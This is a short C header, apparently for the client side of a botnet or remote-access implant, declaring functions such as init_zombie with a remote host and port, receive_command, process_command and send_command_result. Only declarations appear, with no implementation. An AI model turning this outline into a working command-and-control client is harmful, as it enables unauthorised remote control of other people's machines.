#ifndef CONX_H
#define CONX_H

#include "cmd.h"

#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>


void init_zombie(const char *restrict rhost, const uint16_t rport);
void conx();

void receive_command();
void process_command(const char *restrict buffer);
void send_command_result(const char *restrict buffer);

void recreate_socket();

void cleanup();
void fatal_exit(const char *restrict msg);

#endif // CONX_H